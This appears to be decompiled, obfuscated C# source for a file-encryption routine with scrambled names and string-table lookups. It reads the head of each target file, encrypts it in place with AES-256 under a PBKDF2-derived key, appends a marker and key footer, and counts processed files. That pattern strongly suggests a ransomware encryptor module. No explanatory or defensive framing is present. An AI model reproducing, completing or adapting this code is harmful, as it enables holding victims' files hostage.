using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace OlVheIVabxHnbNp;

public static class AuOhTeyyHLvFQ
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] noDpVbcjLlBGQRR(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = HuWqPUepeodcSe(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes HuWqPUepeodcSe(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] ClvHRCYMnWfdH(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (QxgtRZDqToQ.BfbuIxbfjKDpupL == getString_0(107396828))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (QxgtRZDqToQ.VZbRouVLPuojXZ)
			{
				try
				{
					File.AppendAllText(QxgtRZDqToQ.wYgKBMneFetPI, getString_0(107391268) + string_0 + getString_0(107406474) + ex.Message + getString_0(107396718));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void ItvzLPvYpktoAw(string aRhDHhZWWBA, byte[] AsxIYNrXdXG, byte[] sUotJzhLsEhNTFhP = null)
	{
		try
		{
			byte[] array = null;
			if (QxgtRZDqToQ.BfbuIxbfjKDpupL == getString_0(107396828))
			{
				array = (QxgtRZDqToQ.mcFzFNtJADHq ? Encoding.ASCII.GetBytes(QxgtRZDqToQ.MltDPGcncVSc(QxgtRZDqToQ.ekBBOoHwkxPOdO) + QxgtRZDqToQ.MltDPGcncVSc(getString_0(107406448)) + Convert.ToString(QxgtRZDqToQ.zOOQvKyLYnQmc) + QxgtRZDqToQ.MltDPGcncVSc(getString_0(107406448))) : Encoding.ASCII.GetBytes(QxgtRZDqToQ.MltDPGcncVSc(QxgtRZDqToQ.ekBBOoHwkxPOdO) + QxgtRZDqToQ.MltDPGcncVSc(getString_0(107406457)) + Convert.ToString(QxgtRZDqToQ.zOOQvKyLYnQmc) + QxgtRZDqToQ.MltDPGcncVSc(getString_0(107406457))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(aRhDHhZWWBA, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(AsxIYNrXdXG, 0, AsxIYNrXdXG.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(aRhDHhZWWBA, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!QxgtRZDqToQ.mcFzFNtJADHq)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(sUotJzhLsEhNTFhP, 0, sUotJzhLsEhNTFhP.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (QxgtRZDqToQ.mcFzFNtJADHq ? Encoding.ASCII.GetBytes(QxgtRZDqToQ.MltDPGcncVSc(QxgtRZDqToQ.ekBBOoHwkxPOdO) + QxgtRZDqToQ.MltDPGcncVSc(getString_0(107406448)) + Convert.ToString(QxgtRZDqToQ.zOOQvKyLYnQmc) + QxgtRZDqToQ.MltDPGcncVSc(getString_0(107406448))) : Encoding.ASCII.GetBytes(QxgtRZDqToQ.MltDPGcncVSc(QxgtRZDqToQ.ekBBOoHwkxPOdO) + QxgtRZDqToQ.MltDPGcncVSc(getString_0(107406457)) + Convert.ToString(QxgtRZDqToQ.zOOQvKyLYnQmc) + QxgtRZDqToQ.MltDPGcncVSc(getString_0(107406457))));
				FileStream fileStream2 = new FileStream(aRhDHhZWWBA, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(AsxIYNrXdXG, 0, AsxIYNrXdXG.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(aRhDHhZWWBA, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!QxgtRZDqToQ.mcFzFNtJADHq)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(sUotJzhLsEhNTFhP, 0, sUotJzhLsEhNTFhP.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			QxgtRZDqToQ.qmtbLhoLXOw++;
		}
		catch (Exception ex)
		{
			if (QxgtRZDqToQ.VZbRouVLPuojXZ)
			{
				try
				{
					File.AppendAllText(QxgtRZDqToQ.wYgKBMneFetPI, getString_0(107391268) + aRhDHhZWWBA + getString_0(107406407) + ex.Message + getString_0(107396718));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (QxgtRZDqToQ.mcFzFNtJADHq ? Encoding.ASCII.GetBytes(QxgtRZDqToQ.MltDPGcncVSc(QxgtRZDqToQ.ekBBOoHwkxPOdO) + QxgtRZDqToQ.MltDPGcncVSc(getString_0(107406448)) + Convert.ToString(QxgtRZDqToQ.zOOQvKyLYnQmc) + QxgtRZDqToQ.MltDPGcncVSc(getString_0(107406448))) : Encoding.ASCII.GetBytes(QxgtRZDqToQ.MltDPGcncVSc(QxgtRZDqToQ.ekBBOoHwkxPOdO) + QxgtRZDqToQ.MltDPGcncVSc(getString_0(107406457)) + Convert.ToString(QxgtRZDqToQ.zOOQvKyLYnQmc) + QxgtRZDqToQ.MltDPGcncVSc(getString_0(107406457))));
			FileStream fileStream4 = new FileStream(aRhDHhZWWBA, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(AsxIYNrXdXG, 0, AsxIYNrXdXG.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(aRhDHhZWWBA, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!QxgtRZDqToQ.mcFzFNtJADHq)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(sUotJzhLsEhNTFhP, 0, sUotJzhLsEhNTFhP.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static AuOhTeyyHLvFQ()
	{
		Strings.CreateGetStringDelegate(typeof(AuOhTeyyHLvFQ));
	}
}
